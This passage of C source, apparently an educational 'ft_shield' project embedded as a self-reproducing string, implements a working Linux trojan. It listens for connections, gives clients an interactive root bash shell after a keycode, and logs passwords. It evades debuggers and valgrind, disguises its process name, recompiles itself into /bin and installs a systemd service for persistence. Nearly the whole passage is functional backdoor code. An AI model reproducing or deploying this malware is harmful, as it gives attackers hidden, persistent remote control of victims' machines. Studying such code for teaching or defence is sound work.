clients[fd].outpipe_fd;\n\t\t\t}\n\t\t}\n\t}\n\treturn (max_fd);\n}\n\nvoid server_loop(t_server *s)\n{\n\tt_client\t\t\t*clients = s->clients;\n\t\n\tstruct sockaddr_in\taddress;\n\tint\t\t\t\t\taddrlen = sizeof(address);\n\n\twhile (1)\n\t{\n\t\tstruct timeval tv = {.tv_sec = 1, .tv_usec = 0};\n\t\t\n\t\tint max_fd = set_rw_fdset(clients, &s->rfds, &s->wfds, s->fd);\n\n\t\tint retval = select(max_fd + 1, &s->rfds, &s->wfds, NULL, &tv);\n\t\tif (retval == -1)\n\t\t\tft_perror(\"select\");\n\t\telse if (retval != 0)\n\t\t{\n\t\t\tif (FD_ISSET(s->fd, &s->rfds))\n\t\t\t{\n\t\t\t\tint\tclient_fd;\n\t\t\t\tif ((client_fd = accept(s->fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)\n\t\t\t\t{\n\t\t\t\t\tft_perror(\"accept\");\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tif (s->nbr_clients == MAX_NBR_CLIENTS)\n\t\t\t\t{\n\t\t\t\t\tsend(client_fd, MANY_CLIENTS, sizeof(MANY_CLIENTS), 0);\n\t\t\t\t\tft_dprintf(2, \"Connection denied, too many clients\\n\");\n\t\t\t\t\tclose(client_fd);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tchar client_ip[200] = {0};\n\t\t\t\tinet_ntop(AF_INET, &address.sin_addr, client_ip, INET_ADDRSTRLEN);\n\t\t\t\tint client_port = ntohs(address.sin_port);\n\n\t\t\t\tft_dprintf(2, \"Accepted connection from %s:%d\\n\", client_ip, client_port);\n\t\t\t\ts->nbr_clients++;\n\t\t\t\tclients[client_fd].fd = client_fd;\n\t\t\t\tft_dprintf(2, \"New client accepted %d\\n\", client_fd);\n\t\t\t\tif (clients[client_fd].status == HANDSHAKE)\n\t\t\t\t\tsend(client_fd, \"Keycode: \", 10, 0);\n\t\t\t}\n\n\t\t\tfor (int fd = 0; fd <= max_fd; ++fd)\n\t\t\t{\n\t\t\t\tint c_fd = clients[fd].fd;\n\t\t\t\tif (c_fd && FD_ISSET(c_fd, &s->rfds))\n\t\t\t\t{\n\n\t\t\t\t\tchar buffer[1024] = {0};\n\n\t\t\t\t\tint rb = read(c_fd, buffer, sizeof(buffer) - 1);\n\t\t\t\t\tif (rb < 0)\n\t\t\t\t\t{\n\t\t\t\t\t\tft_perror(\"recv\");\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\t\t\t\t\telse if (rb == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\tft_dprintf(2, \"Connection closed %d (recv)\\n\", c_fd);\n\t\t\t\t\t\tclose(c_fd);\n\t\t\t\t\t\tif (clients[fd].outpipe_fd)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tclose(clients[fd].outpipe_fd);\n\t\t\t\t\t\t\tclose(clients[fd].inpipe_fd);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmemset(&clients[fd], 0, sizeof(t_client));\n\t\t\t\t\t\ts->nbr_clients--;\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\ts->total_inbytes += rb;\n\t\t\t\t\t\tclients[fd].inbytes += rb;\n\t\t\t\t\t\thandle_input(s, fd, buffer);\n\t\t\t\t\t}\n\t\t\t\t\tif (clients[fd].status == HANDSHAKE)\n\t\t\t\t\t\tadd2buffer(&clients[fd], strdup(\"Keycode: \"));\n\t\t\t\t}\n\t\t\t\tif (c_fd && FD_ISSET(c_fd, &s->wfds)) {\n\t\t\t\t\tint rpipe = 0;\n\t\t\t\t\tif (clients[fd].outpipe_fd) {\n\t\t\t\t\t\trpipe = extract_outpipe(s, fd);\n\t\t\t\t\t}\n\t\t\t\t\tif (clients[fd].response_bffr) {\n\t\t\t\t\t\tint sb;\n\t\t\t\t\t\tif (rpipe > 0) {\n\t\t\t\t\t\t\tsb = write(c_fd,\n\t\t\t\t\t\t\t\tclients[fd].response_bffr,\n\t\t\t\t\t\t\t\trpipe);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tsb = write(c_fd,\n\t\t\t\t\t\t\t\tclients[fd].response_bffr,\n\t\t\t\t\t\t\t\tstrlen(clients[fd].response_bffr));\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (sb < 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tft_perror(\"recv\");\n\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (sb == 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tft_dprintf(2, \"Connection closed %d (write)\\nBuffer: (%s)\\n\", c_fd, clients[fd].response_bffr);\n\t\t\t\t\t\t\tclose(c_fd);\n\t\t\t\t\t\t\tif (clients[fd].outpipe_fd)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tclose(clients[fd].outpipe_fd);\n\t\t\t\t\t\t\t\tclose(clients[fd].inpipe_fd);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tfree(clients[fd].response_bffr);\n\t\t\t\t\t\t\tmemset(&clients[fd], 0, sizeof(t_client));\n\t\t\t\t\t\t\ts->nbr_clients--;\n\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t}\n\t\t\t\t\t\ts->total_outbytes += sb;\n\t\t\t\t\t\tfree(clients[fd].response_bffr);\n\t\t\t\t\t\tclients[fd].outbytes += sb;\n\t\t\t\t\t\tclients[fd].response_bffr = NULL;\n\t\t\t\t\t\tif (clients[fd].disconnect) {\n\t\t\t\t\t\t\tdelete_client(s, fd);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tt_list *aux = s->passwords;\n\t\t\tint i = 0;\n\t\t\twhile (aux)\n\t\t\t{\n\t\t\t\tft_dprintf(2, \"password %d - %s\\n\", i, (char *)aux->content);\n\t\t\t\ti++;\n\t\t\t\taux = aux->next;\n\t\t\t}\n\t\t\tft_delete_node_if_true(s, &s->pids, shell_was_closed);\n\t\t}\n\t}\n}\n\nvoid\tft_server(t_server *server)\n{\n\tcreate_server_socket(server);\n\tserver_loop(server);\n}\n\n\n/* SERVICE.C */\nvoid\tcreate_service(void)\n{\n\tft_dprintf(2, \"creating service\\n\");\n\tint\tfd_config = open(DEST_SERVICE, O_WRONLY | O_CREAT | O_TRUNC, 0644);\n\tif (fd_config == -1) {\n\t\tft_perror(DEST_SERVICE);\n\t\texit(1);\n\t}\n\tint ret_write = write(fd_config, SERVICE, sizeof(SERVICE));\n\tif (ret_write == -1 || ret_write != sizeof(SERVICE)) {\n\t\tft_perror(\"service\");\n\t}\n\tclose(fd_config);\n}\n\nvoid\tstart_service(void)\n{\n\tft_dprintf(2, \"starting service\\n\");\n\tsystem(\"sudo systemctl daemon-reload\");\n\tsystem(\"sudo systemctl enable ft_shield.service\");\n\tsystem(\"sudo systemctl start ft_shield.service\");\n}\n\n\n/* SHELL.C */\n#include <fcntl.h>\n#include <sys/ioctl.h>\n\nint\tshell_function(t_server *server, int index)\n{\n\tconst int\tclient_fd = server->clients[index].fd;\n\tpid_t\t\tpid;\n\tint\t\t\tinpipe_fds[2], outpipe_fds[2];\n\n\tft_dprintf(2, \"clientfd: %d\\n\", client_fd);\n\n\tpipe(inpipe_fds);\n\tpipe(outpipe_fds);\n\tserver->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin\n\tserver->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here\n\t\n\tpid = fork();\n\tif (pid < 0) {\n\t\tft_perror(\"fork\");\n\n\t}\n\telse if (pid == 0) {\n\t\tsetsid();\n\t\t\n\t\tclose(server->fd);\n\t\tclose(inpipe_fds[WRITE_END]);\n\t\tclose(outpipe_fds[READ_END]);\n\t\tdup2(inpipe_fds[READ_END], STDIN_FILENO);\n\t\tdup2(outpipe_fds[WRITE_END], STDERR_FILENO);\n\t\tdup2(outpipe_fds[WRITE_END], STDOUT_FILENO);\n\t\tclose(inpipe_fds[READ_END]);\n\t\tclose(outpipe_fds[WRITE_END]);\n\t\tclose(client_fd);\n\n\t\tchar *args[] = {\"PyS <3 - Shell\", \"-i\", NULL};\n\t\tsetenv(\"TERM\", \"xterm-256color\", 1);\n\t\texecv(\"/bin/bash\", args);\n\t\texit(1);\n\t}\n\telse if (pid > 0) {\n\t\tft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));\n\t\tclose(inpipe_fds[READ_END]);\n\t\tclose(outpipe_fds[WRITE_END]);\n\t}\n\treturn (1);\n}\n\n\n/* STEALTH.C */\nint\tis_debugger_attached()\n{\n\tFILE *file = fopen(\"/proc/self/status\", \"r\");\n\n\tif (file == NULL) {\n\t\tft_perror(\"/proc/self/status\");\n\t\treturn (1);\n\t}\n\n\twhile (1) {\n\t\tchar line[256] = {0};\n\n\t\tif (fgets(line, sizeof(line), file) == NULL)\n\t\t\tbreak;\n\t\tif (strstr(line, \"TracerPid:\")) {\n\t\t\tint pid = atoi(line + 10);\n\t\t\tif (pid != 0) {\n\t\t\t\tft_dprintf(2, \"Error: running inside a debugger\\n\");\n\t\t\t\tfclose(file);\n\t\t\t\treturn (1);\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tfclose(file);\n\treturn (0);\n}\n\nint\tis_valgrind_running()\n{\n\tFILE *file = fopen(\"/proc/self/maps\", \"r\");\n\n\tif (file == NULL) {\n\t\tft_perror(\"/proc/self/maps\");\n\t\treturn (1);\n\t}\n\n\twhile (1) {\n\t\tchar line[256] = {0};\n\n\t\tif (fgets(line, sizeof(line), file) == NULL)\n\t\t\tbreak;\n\t\tif (strstr(line, \"valgrind\")) {\n\t\t\tft_dprintf(2, \"Running on valgrind\\n\");\n\t\t\tfclose(file);\n\t\t\treturn (1);\n\t\t}\n\t}\n\n\tfclose(file);\n\treturn (0);\n}\n\nvoid\thide_process_name(char **argv)\n{\n\tsize_t len = strlen(argv[0]);\n\tmemset(argv[0], 0, len);\n\tstrncpy(argv[0], \"PyS <3\", len - 1);\n}\n\n\n/* PRINTS.C */\n#ifdef ENABLE\n# include <stdarg.h>\n# include <time.h>\n#endif\n\nvoid ft_dprintf(int fd, const char *format, ...)\n{\n\t#ifdef ENABLE\n\t\ttime_t now = time(NULL);\n\t\tstruct tm *t = localtime(&now);\n\t\tdprintf(fd, \"[%02d:%02d:%02d] \", t->tm_hour, t->tm_min, t->tm_sec);\n\t\t\n\t\tva_list args;\n\t\tva_start(args, format);\n\t\tvdprintf(fd, format, args);\n\t\tva_end(args);\n\t#else\n\t\t(void)fd, (void)format;\n\t#endif\n}\n\nvoid ft_perror(char *str)\n{\n\t#ifdef ENABLE\n\t\ttime_t now = time(NULL);\n\t\tstruct tm *t = localtime(&now);\n\t\tdprintf(2, \"[%02d:%02d:%02d] \", t->tm_hour, t->tm_min, t->tm_sec);\n\t\tperror(str);\n\t#else\n\t\t(void)str;\n\t#endif\n}\n\n\n/* UTILS.C */\nchar\t*ft_strnstr(const char *haystack, const char *needle, size_t len)\n{\n\tsize_t\tpos;\n\tsize_t\ti;\n\n\tif (!*needle)\n\t\treturn ((char *)haystack);\n\tpos = 0;\n\twhile (haystack[pos] && pos < len)\n\t{\n\t\tif (haystack[pos] == needle[0])\n\t\t{\n\t\t\ti = 1;\n\t\t\twhile (needle[i] && haystack[pos + i] == needle[i]\n\t\t\t\t&& (pos + i) < len)\n\t\t\t\t++i;\n\t\t\tif (needle[i] == '\\0')\n\t\t\t\treturn ((char *)&haystack[pos]);\n\t\t}\n\t\t++pos;\n\t}\n\treturn (NULL);\n}\n\nsize_t\tft_strlcpy(char *dest, const char *src, size_t size)\n{\n\tsize_t\ti;\n\n\tif (size == 0)\n\t\treturn (strlen(src));\n\ti = 0;\n\tif (size != 0)\n\t{\n\t\twhile (src[i] != '\\0' && i < (size -1))\n\t\t{\n\t\t\tdest[i] = src[i];\n\t\t\ti++;\n\t\t}\n\t\tdest[i] = '\\0';\n\t}\n\treturn (strlen(src));\n}\n\nchar\t*ft_strtrim(char const *s1, char const *set)\n{\n\tchar\t*final;\n\tsize_t\ti;\n\tsize_t\tsize;\n\n\tfinal = NULL;\n\tif (s1 != NULL && set != NULL)\n\t{\n\t\ti = 0;\n\t\tsize = strlen(s1);\n\t\twhile (s1[i] && strchr(set, s1[i]))\n\t\t\ti++;\n\t\twhile (s1[size -1] && strrchr(set, s1[size -1]) && size > i)\n\t\t\tsize--;\n\t\tfinal = calloc((size - i + 1), sizeof(char));\n\t\tif (final == NULL)\n\t\t\treturn (NULL);\n\t\tft_strlcpy(final, &s1[i], size - i + 1);\n\t}\n\treturn (final);\n}\n\n#define FIXED_OUTPUT_SIZE 16\n#define HEX_OUTPUT_SIZE ((FIXED_OUTPUT_SIZE * 2) + 1)\n\nvoid simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output)\n{\n\tuint8_t buffer[FIXED_OUTPUT_SIZE] = {0};\n\t\n\tfor (size_t i = 0; i < input_len; i++)\n\t{\n\t\tfor (size_t j = 0; j < FIXED_OUTPUT_SIZE; j++)\n\t\t{\n\t\t\tbuffer[j] ^= input_data[i] + (i * j * 17);\n\t\t\tbuffer[j] = (buffer[j] * 13) % 256;\n\t\t}\n\t}\n\n\tfor (size_t i = 0; i < FIXED_OUTPUT_SIZE; i++)\n\t{\n\t\tbuffer[i] ^= buffer[(i + 5) % FIXED_OUTPUT_SIZE];\n\t\tbuffer[i] += buffer[(i + 11) % FIXED_OUTPUT_SIZE];\n\t}\n\n\tfor (size_t i = 0; i < FIXED_OUTPUT_SIZE; i++)\n\t\tsprintf(output + (i * 2), \"%02X\", buffer[i]);\n\toutput[HEX_OUTPUT_SIZE - 1] = '\\0';\n}\n\nchar\t*gen_random_password(void)\n{\n\tuint8_t input[64];\n\n\tint fd = open(\"/dev/urandom\", O_RDONLY);\n\tint ret_read = read(fd, input, 64);\n\n\tif (ret_read <= 0)\n\t\treturn (NULL);\n\tchar *password = calloc(HEX_OUTPUT_SIZE, sizeof(char));\n\n\tsimple_deterministic_id(input, ret_read, password);\n\tclose(fd);\n\treturn (password);\n}\n\nstatic char\t*ft_strjoin(char const *s1, char const *s2)\n{\n\tsize_t\ts1len;\n\tsize_t\ts2len;\n\tchar\t*res;\n\tsize_t\tpos;\n\n\ts1len = strlen(s1);\n\ts2len = strlen(s2);\n\tres = malloc(s1len + s2len + 1);\n\tif (res == (void *) 0)\n\t\treturn (res);\n\tpos = 0;\n\twhile (pos < s1len)\n\t{\n\t\tres[pos] = s1[pos];\n\t\t++pos;\n\t}\n\tpos = 0;\n\twhile (pos <= s2len)\n\t{\n\t\tres[pos + s1len] = s2[pos];\n\t\t++pos;\n\t}\n\treturn (res);\n}\n\nvoid\tadd2buffer(t_client *client, char *str) {\n\tif (!client->response_bffr) {\n\t\tclient->response_bffr = str;\n\t\treturn ;\n\t}\n\tchar *new = ft_strjoin(client->response_bffr, str);\n\tfree(str);\n\tfree(client->response_bffr);\n\tclient->response_bffr = new;\n}\n\n/* LST.C */\nt_list\t*ft_lstnew(void *content)\n{\n\tt_list *lst = calloc(1, sizeof(t_list));\n\n\tif (lst == NULL)\n\t\treturn (NULL);\n\tlst->content = content;\n\treturn (lst);\n}\n\nt_list\t*ft_lstlast(t_list *lst)\n{\n\tt_list *aux = lst;\n\n\tif (aux == NULL)\n\t\treturn (NULL);\n\twhile (aux->next != NULL)\n\t\taux = aux->next;\n\treturn (aux);\n}\n\nvoid\tft_lstadd_back(t_list **lst, t_list *new_node)\n{\n\tif (new_node == NULL)\n\t\treturn ;\n\tif (*lst == NULL)\n\t{\n\t\t*lst = new_node;\n\t\treturn ;\n\t}\n\tft_lstlast(*lst)->next = new_node;\n}\n\nbool shell_was_closed(t_list *node)\n{\n\tpid_t pid_shell = (int)(long)node->content;\n\n\tint status;\n\tint res_wait = waitpid(pid_shell, &status, WNOHANG);\n\tif (pid_shell)\n\t\tft_dprintf(2, \"active shell: %d res wait %d\\n\", pid_shell, res_wait);\n\tif (res_wait == pid_shell)\n\t{\n\t\tft_dprintf(2, \"process %d has finished\\n\", res_wait);\n\t\treturn (true);\n\t}\n\treturn (false);\n}\n\nvoid ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *))\n{\n\tt_list *current = *lst;\n\tt_list *prev = NULL;\n\tt_list *next;\n\n\twhile (current != NULL)\n\t{\n\t\tnext = current->next;\n\t\tif (f(current) == true)\n\t\t{\n\t\t\tft_dprintf(2, \"deleting node with content %ld\\n\", (long)current->content);\n\t\t\t//server->nbr_clients--;\n\t\t\tft_dprintf(2, \"there are %d connections\\n\", server->nbr_clients);\n\t\t\tif (prev == NULL)\n\t\t\t\t*lst = next;\n\t\t\telse\n\t\t\t\tprev->next = next;\n\t\t\tfree(current);\n\t\t}\n\t\telse\n\t\t\tprev = current;\n\t\tcurrent = next;\n\t}\n}\n\nvoid\tft_lstdelone(t_list *lst, void (*del)(void *))\n{\n\tif (del != NULL)\n\t\t(*del)(lst->content);\n\tfree(lst);\n}\n\nvoid\tft_lstclear(t_list **lst, void (*del)(void *))\n{\n\tt_list\t*tmp;\n\n\twhile (lst && *lst)\n\t{\n\t\ttmp = (*lst)->next;\n\t\tft_lstdelone(*lst, del);\n\t\t*lst = tmp;\n\t}\n}\n\n\n/* FIND_EXEC_PATH.C */\nint\tfind_own_path(char *buffer, size_t size_buffer)\n{\n\tconst char *paths[] = {\n\t\t\"/proc/self/exe\",        // Linux\n\t\t\"/proc/curproc/file\",    // FreeBSD\n        \"/proc/self/path/a.out\", // Solaris\n        \"/proc/curproc/exe\",     // NetBSD\n        NULL\n    };\n\n\tfor (int i = 0; paths[i]; ++i)\n\t{\n\t\tint readed = readlink(paths[i], buffer, size_buffer);\n\t\tif (readed != -1)\n\t\t{\n\t\t\tft_dprintf(2, \"readlink: [%s]\\n\", buffer);\n\t\t\treturn (i);\n\t\t}\n\t}\n\treturn (-1);\n}\n\n\n/* MAIN.C */\nchar path[PATH_MAX] = {0};\nchar dir_name[PATH_MAX] = {0};\n\nbool\tfind_dir(char *dirname)\n{\n\tchar\t*exec_paths = getenv(\"PATH\");\n\tchar\t*location = ft_strnstr(exec_paths, dirname, -1);\n\n\tif (location != NULL) {\n\t\tft_dprintf(2, \"found [%s]\\n\", location);\n\t\treturn (true);\n\t}\n\treturn (false);\n}\n\nbool\tneed_to_install_server(void)\n{\n\tif (find_own_path(path, sizeof(path)) == -1) {\n\t\tft_dprintf(2, \"can't find own executable\\n\");\n\t\texit(1);\n\t}\n\n\tmemmove(dir_name, path, sizeof(path));\n\tdirname(dir_name);\n\tft_dprintf(2, \"dir_name: [%s]\\n\", dir_name);\n\tif (find_dir(dir_name) == true) {\n\t\tft_dprintf(2, \"We are already in the infected path: [%s]\\n\", dir_name);\n\t\treturn (false);\n\t}\n\tft_dprintf(2, \"we need to install the server: [%s]\\n\", path);\n\treturn (true);\n}\n\nvoid\tcompact_binary(void)\n{\n\tchar compact_cmd[PATH_MAX] = {0};\n\tchar *filename = strdup(path);\n\n\tft_dprintf(2, \"binary: %s\\n\", filename);\n\tsprintf(compact_cmd, \"cp %s %s.tmp; strip --strip-all %s.tmp; mv %s.tmp %s\", filename, filename, filename, filename, filename);\n\tft_dprintf(2, \"cmd: %s\\n\", compact_cmd);\n\tfree(filename);\n\n\tsystem(compact_cmd);\n\n\tchar\t*argv[] = {\n\t\tpath, \"--compacted\", NULL\n\t};\n\n\tft_dprintf(2, \"binary compacted\\n\");\n\tft_dprintf(2, \"----------------\\n\");\n\texecv(path, argv);\n\texit(1);\n}\n\n\nextern char *source_code;\n\nvoid print_code(const char *str, int fd)\n{\n\tdprintf(fd, \"\\\"\");\n\tfor (int i = 0; str[i]; i++)\n\t{\n\t\tif (str[i] == '\"')\n\t\t\tdprintf(fd, \"\\\\\\\"\");\n\t\telse if (str[i] == '\\n')\n\t\t\tdprintf(fd, \"\\\\n\");\n\t\telse if (str[i] == '\\\\')\n\t\t\tdprintf(fd, \"\\\\\\\\\");\n\t\telse if (str[i] == '\\t')\n\t\t\tdprintf(fd, \"\\\\t\");\n\t\telse\n\t\t\tdprintf(fd, \"%c\", str[i]);\n\t}\n\tdprintf(fd, \"\\\";\\n\");\n}\n\n#define TEMP_SHIELD \"/tmp/ft_shield.c\"\n#define DEST_PATH \"/bin/ft_shield\"\n\nvoid\tquine(void)\n{\n\tint fd_dst = open(TEMP_SHIELD, O_WRONLY | O_CREAT | O_TRUNC, 0755);\n\tif (fd_dst == -1) {\n\t\tft_perror(TEMP_SHIELD);\n\t\tclose(fd_dst);\n\t\treturn ;\n\t}\n\tdprintf(fd_dst, \"%s\", source_code);\n\tprint_code(source_code, fd_dst);\n\tclose(fd_dst);\n\tsystem(\"gcc \"TEMP_SHIELD\" -o \"DEST_PATH);\n}\n\nvoid\tinstall_server(int argc, char **argv)\n{\n\tif (argc == 1 && argv[1] == NULL)\n\t\tcompact_binary();\n\tft_dprintf(2, \"running as compacted binary\\n\");\n\tft_dprintf(2, \"---------------------------\\n\");\n\tprintf(\"%s\\n\", \"psegura- & sacorder\");\n\tdaemon(1, 1);\n\tquine();\n\tcreate_service();\n\tstart_service();\n}\n\nvoid\texec_troyan(void)\n{\n\tt_server server;\n\n\tmemset(&server, 0, sizeof(t_server));\n\tft_server(&server);\n}\n\nint main(int argc, char **argv)\n{\n\tif (is_debugger_attached())\n\t\treturn (1);\n\tif (is_valgrind_running())\n\t\treturn (1);\n\tif (geteuid() != 0) {\n\t\tft_dprintf(2, \"Error: not running as root\\n\");\n\t\treturn (1);\n\t}\n\n\tif (need_to_install_server()) {\n\t\tinstall_server(argc, argv);\n\t} else {\n\t\thide_process_name(argv);\n\t\texec_troyan();\n\t}\n}\n\nchar *source_code = ";
